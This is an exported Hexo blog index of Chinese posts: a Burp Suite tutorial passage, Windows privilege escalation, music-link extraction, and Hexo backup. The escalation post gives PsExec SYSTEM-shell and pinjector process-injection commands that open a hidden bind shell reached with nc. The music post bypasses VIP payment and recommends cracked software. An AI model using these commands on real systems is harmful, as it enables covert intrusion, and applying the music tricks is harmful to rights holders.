data-echo="https://s1.ax1x.com/2020/04/19/Juw0mV.png" alt><br>　　这年头谁还没有个字典呢，开始攻击<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwBwT.png" alt><br>　　经过漫长的等待后终于跑完了<br>　　知识点补充:通过响应内容的长度可以作为一个特征来发现那个是正确的密码，或者通过响应的状态码，点击length可以进行升序或者降序排列。<br>　　升序排列后如下图所示，既然用户名正确，哪就慢慢往下找看有没有正确的密码了<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwskF.png" alt><br>　　仔细看这独一无二的响应码437，其实一般爆破成功后，length一筛选马上就能发现那个秀儿，成功拿到flag<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwDTU.png" alt></p><h5 id="列子2"><a href="#列子2" class="headerlink" title="列子2"></a>列子2</h5><p>　　靶机DVWA前面步骤都大同小异，已经知道登录名和密码了，payload就没必要设置那么多了，直接跳到最后查看结果部分<br>　　可以看到状态码也都一样，length也都一样<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwyY4.png" alt><br>　　直接查看验证正确的响应包<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwdO0.png" alt><br>　　查看其他的响应包<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juw6fJ.png" alt><br>　　仔细查看有一处不一样就是Location，一个是index.php，一个是login.php 这两个刚好都是5个字符，所以筛选出含有index.php的结果，这时候就会将我们想要的结果筛选出来<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwWOx.png" alt></p><h5 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h5><p>　　此模块我一般称之为自定义发包器，可以手动发送单个请求包。从而查看响应包中的结果来进入测试<br>　　老规矩，随便选择一个请求包，右键发送到Repeater<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJDf0.png" alt><br>　　来到Repeater模块，具体测试内容可以自己添加或者删除都行<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ4t1.png" alt><br>　　右键在请求头中可以看到有很多选择<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8Ksg.png" alt><br>　　选择Change request method(改变请求方式)后，即POST变成GET，GET变成POST，入图所示，当POST变成GET点击GO，响应包的内容明显跟POST请求的响应包不一样<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8MLQ.png" alt><br>　　选择Change body encoding之前请求包必须是POST方式，GET方式无效<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8mz8.png" alt><br>　　当然也可以生成CSRF poc强大到令人发指2333<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8lZj.png" alt><br>　　选择后新打开CSRF Poc窗口，注意在burp v1.7.32中在浏览器测试我这里已经失效，如果要测试copy html，保存为html文件后，来打开测试<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju81ds.png" alt><br>　　选择Copy as curl command，会复制curl命令，在记事本中粘贴下来，在kali的命令行中使用命令<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8eRf.png" alt><br>　　curl是一个非常强大的命令，它会向服务器发起http或者ftp等等请求，然后反馈服务器响应<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju0SAS.png" alt></p><h3 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h3><p>　　Sequencer(定序器)是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。<br>　　下面演示如何来测试PHPSESSID的随机性，想详细了解session的作用参考这篇文章<a href="https://blog.csdn.net/h19910518/article/details/79348051" target="_blank" rel="noopener">session的作用</a><br>　　而且计算机基本都是采用伪随机数算法，即不会做到一个真正现实世界中的随机，理论上来讲只要测试数据量够大，就能找到一个生成的seesion cookie的循环周期，来预测下一个seesion cookie。所以此模块就是评估生成的随机数质量怎么样</p><h5 id="测试DVWA的session"><a href="#测试DVWA的session" class="headerlink" title="测试DVWA的session"></a>测试DVWA的session</h5><h5 id="清除cookie"><a href="#清除cookie" class="headerlink" title="清除cookie"></a>清除cookie</h5><p>　　我这里是测试dvwa的seeion，所以先到登陆页面将cookie清除掉，选择Delete All后<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8OOg.png" alt></p><h5 id="删除站点"><a href="#删除站点" class="headerlink" title="删除站点"></a>删除站点</h5><p>　　Target-&gt;site map来到站点地图后，选择dvwa站点后右键，delete host，选择yes删除<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8bSf.png" alt></p><h5 id="抓取set-cookie请求包"><a href="#抓取set-cookie请求包" class="headerlink" title="抓取set-cookie请求包"></a>抓取set-cookie请求包</h5><p>　　清除掉cookie和删除掉站点后，重新进入dvwa的登陆界面，此时burp会重新记录到请求包<br>　　到Proxy-&gt;HTTP history可以看到历史请求，点击filter输入set-cookie，只看设置cookie的<b>响应包</b>过滤完后，找到响应包发送进sequencer<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8RyD.png" alt><br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju85TA.png" alt></p><h5 id="选择测试的cookie"><a href="#选择测试的cookie" class="headerlink" title="选择测试的cookie"></a>选择测试的cookie</h5><p>　　burp会自动识别可用的cookie，security是安全级别设置，不是我们要测试的，所以选择PHPSESSID。如果burp没有识别出来，点击手动配置<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJMTA.png" alt><br>　　手动选择好后，点击ok即可，点击Start live capture(开始实时捕获)开始测试<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJKwd.png" alt></p><h5 id="查看分析结果"><a href="#查看分析结果" class="headerlink" title="查看分析结果"></a>查看分析结果</h5><p>　　发送的中途你就可以直接点击开始分析，当然数据量越大，得到的结果更准确<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8tzT.png" alt><br>　　可以看到随机性质量结果的是excellent(优秀)<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJkJx.png" alt><br>　　<a href="https://baike.baidu.com/item/FIPS%20140-2/635016?fr=aladdin" target="_blank" rel="noopener">FIPS</a>(美国联邦信息处理标准)，其提供了密码模块评测、验证和最终认证的基础，所以只要通过了他们的验证标准，加密安全都是高的。可以看到session的评估质量远远高出及格线<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8YWV.png" alt></p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>　　用来编码的加密解密，没有什么可以介绍的。直接网上找一个在线加密解密我都感觉比这个强不少<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8ql8.png" alt></p><h3 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h3><p>　　比较器，顾名思义比较两次数据之间的区别<br>　　将dvwa中的登陆请求包发送进Repeater模块后，选择发送后，在响应包中右键send to Comparer，这次是正确的用户名和密码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju84wd.png" alt><br>　　这次输入错误的用户名和密码，一样发送到比较器<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJUmQ.png" alt><br>　　它这个是同一个内容分成了多个窗口而已，第一个窗口选择第一个或者第二个，那么第二个窗口必定要选择不同的，不然自己跟自己比较吗？选择按内容比较<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8L6S.png" alt><br>　　下面是比较结果，当然你也可以比较两个项目的不同<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juw5TO.png" alt></p><h3 id="Alerts"><a href="#Alerts" class="headerlink" title="Alerts"></a>Alerts</h3><p>　　　此模块是消息提醒，有一个好处就是看代理服务是否开启<br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwUln.png" alt></p><h3 id="Extender"><a href="#Extender" class="headerlink" title="Extender"></a>Extender</h3><p>　　Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。<br>　　在BApp Store中，根据受欢迎程度，排名等等筛选出自己喜欢的扩展功能，不多介绍</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　burp是一款安全中不可多得的神器，也是从事安全人士必须掌握的一款工具，总之一句话burp牛逼。</p><center><font color="#666666">Thanks♪(･ω･)ﾉ for reading</font></center>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权</title>
      <link href="/2020/03/19/57748.html"/>
      <url>/2020/03/19/57748.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　本章主要是讲关于win10下的提权合集，温馨提示cmd请以管理员身份运行，不然会出现权限不够等问题。第一次写渗透测试实验报告，如有错误，请多包涵。<br><a id="more"></a></p><h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><p>　　<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals</a><br>　　<a href="https://www.tarasco.org/security/Process_Injector/index.html" target="_blank" rel="noopener">Pinjector</a></p><h3 id="whoami命令"><a href="#whoami命令" class="headerlink" title="whoami命令"></a>whoami命令</h3><p>　　利用whoami查看当前计算机登陆的用户和组<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/7d8be4d3bdfe76ce632439cf4a8cc36f933bb6df.png" alt><br>　　可以看出当前是在desktop-3vs7u23\lion组中</p><h3 id="psexec提权"><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h3><p>　　将Sysinternals中的psexec.exe拷贝到C:\Windows\System32下后<br>　　输入PsExec.exe -i -s cmd命令<br>　　-i 命令是运行程序，使其与远程系统上指定会话的桌面进行交互<br>　　-s 在系统帐户中运行该服务进程<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/cf30cdaecdfe15a98f4adef1451925acb63a82c1.png" alt><br>　　这时会弹出一个新的cmd框，在新的cmd框中再次输入whoami命令<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/183a1b3ea3bfcc16aaa1f3313ffd44492eb1130e.png" alt><br>　　发现用户组已经变成了nt authority\system<br>　　此时试试打开一个notepad，查看登陆用户<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/b60b09d039ff08fadd14d13608bedaa5925cca15.png" alt><br>　　可以看见登陆用户是system，即在此cmd框中创建的用户都是system</p><h3 id="pinjector注入进程提权"><a href="#pinjector注入进程提权" class="headerlink" title="pinjector注入进程提权"></a>pinjector注入进程提权</h3><p>　　将 pinjector.exe拷贝到C:\Windows\System32下<br>　　执行pinjector -l查看可注入的进程<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/ec1fc70581493c74215661abf4de5f767ecefaa6.png" alt><br>　　看红线可知有很多用户和组，我们只需要注入带system组的进程<br>　　执行pinjector -l | find “SYSTEM” 查找只包含SYSTEM的进程<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/60552a37d847d643c7d5c50173a1eb48b44b1142.png" alt><br>　　执行pinjector -p 648 cmd 333<br>　　-p 表示当前的pid然后执行一个cmd命令框并且再本地开启333端口，端口在后面nc会使用<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/17a65c2464172a94af54f15b98244a7c632a0be7.png" alt><br>　　并不是所有的进程都能注入成功，以下就是失败的情况<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/50c497250217257363a1929428187287c05c39c3.png" alt><br>　　这时只能一个一个试，直到找到一个能成功注入的进程<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/9b9620095929aa2a0f7520579856afde40c4542a.png" alt><br>　　执行netstat -an查看端口开启是否成功<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/fe0c8adf067044cd9cff7eacaa7622a17a8d4d1e.png" alt><br>　　利用nc命令来连接，并查看提权是否成功<br>　　<img src="https://i0.hdslb.com/bfs/album/632da9a79b46110a4610b3b519d94f3d62eafca1.png"><br>　　可以看到提权已经成功了，这时在打开靶机的任务管理器，发现有一个cmd.exe，除此之外并没有多余的进程产生，利用注入进程的方式隐蔽性极高，很难发现<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/13c1581a977412cd23ac25d9f2bd80f955ec8132.png" alt><br>　　打开Sysinternals中的procexp.exe，此工具是进程管理工具，查看当前有哪些可疑的进程<br>　　<img src data-echo="https://i0.hdslb.com/bfs/album/4b599dd8670a013928a928128bac06482fca3f92.png" alt><br>　　因为我是向sladmin进程注入的，为了演示可以很清楚的看见有一个cmd.exe在运行中，如果注入进一个系统服务后，查找难度可想而知　　</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取酷我音乐，网易云真实外链</title>
      <link href="/2020/01/13/28534.html"/>
      <url>/2020/01/13/28534.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在搞博客的时候，总想获取各大网站的音乐外链，试了网上很多方法后，发现各大音乐平台只要是vip才能听的，那些方法都会失效。今天偶然发现酷我音乐亲测有效，又能白嫖一波o(<em>￣︶￣</em>)o。</p><a id="more"></a><h3 id="获取音乐id"><a href="#获取音乐id" class="headerlink" title="获取音乐id"></a>获取音乐id</h3><p>下面以付费音乐为例，下图中可以清楚的看到是付费音乐，其中红线部分是音乐id。<br><img src data-echo="https://i0.hdslb.com/bfs/album/a22a726ac925ddeb6f3f8471473c7f64b7a88046.png" alt></p><h3 id="酷我获取音频外链"><a href="#酷我获取音频外链" class="headerlink" title="酷我获取音频外链"></a>酷我获取音频外链</h3><p>将以下url地址进行拼接<br><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://antiserver.kuwo.cn/anti.s?useless=/resource/<span class="variable">&amp;format</span>=mp3<span class="variable">&amp;rid</span>=MUSIC_音乐id<span class="variable">&amp;response</span>=res<span class="variable">&amp;type</span>=convert_url&amp;</span><br></pre></td></tr></table></figure><br>我的就是<a href="https://antiserver.kuwo.cn/anti.s?useless=/resource/&amp;format=mp3&amp;rid=MUSIC_41476545&amp;response=res&amp;type=convert_url&amp;" target="_blank" rel="noopener">https://antiserver.kuwo.cn/anti.s?useless=/resource/&amp;format=mp3&amp;rid=MUSIC_41476545&amp;response=res&amp;type=convert_url&amp;</a><br>至此音频获取成功<br><img src data-echo="https://i0.hdslb.com/bfs/album/384ddf522accafc362f218dbb07111e86e5f5bbb.png" alt></p><h3 id="网易获取音频外链"><a href="#网易获取音频外链" class="headerlink" title="网易获取音频外链"></a>网易获取音频外链</h3><p>列如网易云的音频链接为：<a href="http://music.163.com/#/song?id=317151" target="_blank" rel="noopener">http://music.163.com/#/song?id=317151</a><br>真实外链为<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//mu</span>sic.<span class="number">163</span>.com<span class="regexp">/song/m</span>edia<span class="regexp">/outer/u</span>rl?id=数字.mp3</span><br></pre></td></tr></table></figure><br><b>就是如此的简单，当然这只是外链党的福音，至于有效期是多久就看运气吧。如果你只是想单纯的听听音乐，我还是建议去搞个KuWo音乐破解版吧</b></p><center><font style="font-size:15px;color:grey;">每天学一点儿黑科技，走进互联网真实大门</font></center>]]></content>
      
      
      <categories>
          
          <category> 黑科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐外链 </tag>
            
            <tag> KuWo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客恢复</title>
      <link href="/2020/01/13/35585.html"/>
      <url>/2020/01/13/35585.html</url>
      
        <content type="html"><![CDATA[<p>标题的意思是指如何在其他电脑继续使用hexo写博客，前提是你备份了你的hexo文件，注意当你配置好了hexo环境后，勿用hexo init命令。</p><a id="more"></a><h3 id="拷贝以下文件到博客根目录下"><a href="#拷贝以下文件到博客根目录下" class="headerlink" title="拷贝以下文件到博客根目录下"></a>拷贝以下文件到博客根目录下</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">_config</span>.</span></span>yml</span><br><span class="line"> package.json</span><br><span class="line"> scaffolds/</span><br><span class="line"> source/</span><br><span class="line"> themes/</span><br></pre></td></tr></table></figure><h3 id="执行模块安装的命令"><a href="#执行模块安装的命令" class="headerlink" title="执行模块安装的命令"></a>执行模块安装的命令</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> -g hexo</span><br><span class="line">npm <span class="keyword">install</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-generator-feed <span class="comment">--save</span></span><br><span class="line">npm <span class="keyword">install</span> hexo-generator-sitemap <span class="comment">--save</span></span><br></pre></td></tr></table></figure><h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>提醒一下，当你在其他电脑执行hexo d命令时，远程仓库的commits将会全部清空。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客备份</title>
      <link href="/2020/01/10/38686.html"/>
      <url>/2020/01/10/38686.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>强烈建议hexo博客搭建完毕后，并且上传到github后，做的第一件事情是去将你的hexo博客备份到github上去。我知道你肯定很开心搭建博客成功，想怎么怎么去美化你的博客，我想说数据无价，如果你跟笔者有着因为没有备份hexo博客数据，而造成不可逆的后果后，想想都是泪，备份完后再去美化你的博客吧！</p><a id="more"></a><h3 id="建立hexo分支"><a href="#建立hexo分支" class="headerlink" title="建立hexo分支"></a>建立hexo分支</h3><p>在博客目录下输入新分支命令(比如我的博客在E:\blog)</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span> checkout -<span class="keyword">b </span>hexo</span><br></pre></td></tr></table></figure><p><strong>hexo</strong>是自定义的分支的名称，建议命名成hexo</p><h3 id="提交分支到Github"><a href="#提交分支到Github" class="headerlink" title="提交分支到Github"></a>提交分支到Github</h3><p>一样在hexo博客的目录下输入以下命令</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span> <span class="keyword">add </span>.//注意<span class="keyword">add后面有一个空格</span></span><br><span class="line"><span class="keyword">git </span>commit -m <span class="string">"Backup"</span></span><br><span class="line"><span class="symbol">git</span> <span class="keyword">push </span>origin hexo//将hexo分支提交到github上去</span><br></pre></td></tr></table></figure><p>你提交分支可能会失败，这里每个人的情况不一样，根据报错信息,自己解决，我反正搞了很久才提交成功。<br>提交成功后，你可以看到github上有两个分支如图所示.<br><img src data-echo="hexo博客备份/successful.png" alt></p><h3 id="安装hexo备份插件"><a href="#安装hexo备份插件" class="headerlink" title="安装hexo备份插件"></a>安装hexo备份插件</h3><p>输入命令<code>hexo version</code>查看Hexo版本</p><p><img src data-echo="hexo博客备份/hexo_version.png" alt></p><p>Hexo版本是2.x.x使用以下命令,我的版本可以看到是4.2.0</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-git-<span class="symbol">backup@</span><span class="number">0.0</span><span class="number">.91</span> --save</span><br></pre></td></tr></table></figure><p>Hexo版本是3.x.x使用,我的虽然是4.2.0使用下面命令亲测有效</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-git-<span class="keyword">backup</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>到Hexo博客的根目录<code>_config.yml</code>添加以下配置,添加到文件末尾即可</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">backup</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">theme</span>: yelee</span><br><span class="line">  <span class="attribute">message</span>: Back up my blog</span><br><span class="line">  <span class="attribute">repository</span>:</span><br><span class="line">    <span class="attribute">github</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:githubname/githubname.github.io.git,hexo</span><br></pre></td></tr></table></figure><p>theme:选择备份的主题<br>message:自定义提交信息<br>repository:仓库名,分支名，已经建立过hexo分支，所以填hexo，githubname填写成你github上的用户名</p><h3 id="备份博客数据"><a href="#备份博客数据" class="headerlink" title="备份博客数据"></a>备份博客数据</h3><p>最后输入以下命令开始备份博客</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo b</span></span><br></pre></td></tr></table></figure><p>备份成功后，你将在你的分支下看到备份好的数据</p><p><img src data-echo="hexo博客备份/backup.png" alt></p><p>如果你没有备份成功，那么请使用hexo b后再使用git push origin hexo命令,反正我是没有备份成功后，找了半天教程，才发现这样我才能备份成功，无语了。</p><p>以上内容我不能保证你100%成功，那么请善用搜索引擎，成功绝对不是偶然。</p><center>♥感谢你的阅读♥</center>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
